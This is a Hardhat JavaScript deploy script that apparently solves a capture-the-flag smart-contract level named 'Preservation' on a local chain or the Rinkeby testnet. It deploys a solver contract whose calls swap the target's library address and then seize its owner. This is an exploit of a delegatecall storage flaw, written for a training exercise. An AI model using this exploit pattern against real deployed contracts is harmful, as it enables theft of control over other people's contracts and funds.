const { network, ethers, getUnnamedAccounts } = require("hardhat")
const { networkConfig, developmentChains, generateGateKey } = require("../helper-hardhat-config")

module.exports = async ({ getNamedAccounts, deployments }) => {
    const { deploy, log } = deployments
    const { deployer } = await getNamedAccounts()
    const chainId = network.config.chainId

    let preservation
    if (developmentChains.includes(network.name)) {
        // On localhost, deploy the contracts
        log("Localhost: Deploying Library and Preservation...")
        const anotherAccount01 = (await getUnnamedAccounts())[0]
        const libraryDeployment01 = await deploy("LibraryContract", {
            from: anotherAccount01,
            args: [],
            log: true,
        })
        const libraryDeployment02 = await deploy("LibraryContract", {
            from: anotherAccount01,
            args: [],
            log: true,
        })
        const preservationDeployment = await deploy("Preservation", {
            from: anotherAccount01,
            args: [libraryDeployment01.address, libraryDeployment02.address],
            log: true,
        })

        preservation = await ethers.getContractAt("Preservation", preservationDeployment.address, deployer)
    } else {
        // Get the contract address in Rinkeby
        preservation = await ethers.getContractAt("Preservation", "0x262a147A1EDF3a36bf3106FeE3E4a16D9BDE71E7", deployer)
    }

    const preservationSolverDeployment = await deploy("PreservationSolver", {
        from: deployer,
        args: [],
        log: true,
    })

    const solver = await ethers.getContractAt("PreservationSolver", preservationSolverDeployment.address, deployer)

    // Provider player address here
    const newOwner = "0x00"

    const ownerOriginal = await preservation.owner()
    const txResponse = await solver.swapLibrary1(preservation.address)
    const txReceipt = txResponse.wait(1)
    await solver.swapOwner(preservation.address, newOwner)
    const ownerAfter = await preservation.owner()
    log(`Owner changed from ${ownerOriginal} to ${ownerAfter}`)
}

module.exports.tags = ["all", "preservation"]
